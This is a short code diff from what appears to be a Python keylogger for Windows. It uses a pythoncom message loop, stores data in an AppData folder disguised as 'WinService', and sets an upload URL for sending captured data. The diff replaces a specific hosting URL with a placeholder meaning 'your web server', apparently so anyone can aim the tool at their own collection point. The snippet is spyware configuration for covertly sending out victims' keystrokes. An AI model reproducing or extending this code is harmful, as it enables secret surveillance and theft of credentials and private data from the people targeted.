@@ -107,7 +107,7 @@ def main():
     pythoncom.PumpMessages()
 
 
-urlUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"
+urlUpload = "https://SEUSERVIDORWEB/upload.php"
 ldir = 'C:\Users\Usuario\AppData\Roaming\WinService'
 window = None
 data = ''
